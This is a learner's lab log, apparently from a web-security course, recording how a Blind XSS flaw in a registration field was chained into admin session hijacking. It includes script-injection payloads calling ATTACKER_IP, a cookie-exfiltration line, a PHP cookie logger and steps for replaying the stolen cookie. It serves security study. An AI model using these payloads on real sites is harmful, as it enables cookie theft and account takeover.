---
layout: log
title: "Day 29 - Blind XSS & Session Hijacking"
date: 2026-04-16
topics: ["Blind XSS", "Session Hijacking", "JavaScript", "Web Exploitation"]
summary: "Identified Blind XSS in registration form, exfiltrated admin cookie, and hijacked authenticated session."
status: complete
---

# Day 29 – Blind XSS → Admin Session Hijack

## Objective

- identify Blind XSS vulnerability
- confirm execution via out-of-band interaction
- escalate to session hijacking

---

## Summary

The application contained a Blind XSS vulnerability in the `website` field of the registration form.  
By injecting a payload that loaded a remote script, I confirmed execution in the admin review panel.  
A second-stage payload was used to exfiltrate the admin’s session cookie.  
After importing the cookie into my browser, I successfully hijacked the admin session and accessed the protected area.

---

## Attack flow

```

Blind XSS → External script execution → Cookie exfiltration → Session hijack → Admin access

```

---

## What I actually did (important)

### 1. Detection

Tested input fields for XSS and identified execution in a non-visible admin context.

Payload:
```

"><script src=http://ATTACKER_IP:8080/website></script>

```

Confirmed via server log callback:
```

GET /website

````

→ proves:
- payload execution
- Blind XSS (admin-side rendering)

---

### 2. Listener setup

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:8080
````

---

### 3. Cookie exfiltration payload

```javascript
new Image().src='http://ATTACKER_IP:8080/index.php?c='+document.cookie
```

---

### 4. Backend logger

```php
<?php
if (isset($_GET['c'])) {
    $file = fopen("cookies.txt", "a+");
    fputs($file, "Cookie: {$_GET['c']}\n");
    fclose($file);
}
?>
```

---

### 5. Final exploit payload

```
"><script src=http://ATTACKER_IP:8080/script.js></script>
```

→ executed when admin reviewed the entry

---

### 6. Session hijacking

Captured cookie:

```
cookie=c00k1355h0u1d8353cu23d
```

Steps:

* opened `/hijacking/login.php`
* added cookie manually in browser dev tools
* refreshed page

→ authenticated as admin

---

## What went well

* successfully identified Blind XSS (harder than normal XSS)
* understood out-of-band execution flow
* chained vulnerability into full session hijack
* clean separation between detection and exploitation stages

---

## What was confusing

* at first it wasn’t obvious where the payload was executing
* needed to trust the callback instead of visual feedback
* keeping payloads clean and structured

---

## Mistakes / friction

* initially forgot to replace ATTACKER_IP in payload
* small formatting issues in long payloads
* overthinking the setup instead of testing quickly

---

## What I think I understand now

* Blind XSS requires thinking in **asynchronous execution**
* callbacks are proof, not visual output
* real impact comes from chaining → not just finding the vuln
* session hijacking is often just one step away from XSS

---

## Real life context

* attended THWS job fair (networking + industry exposure)
* balanced technical work with uni / real life again

---

## Plan for next session

* finish XSS module completely
* revisit SQLMap and combine with web attacks
* practice faster payload iteration

---

## Session info (optional)

* Duration: 5h
* Energy: Medium–High
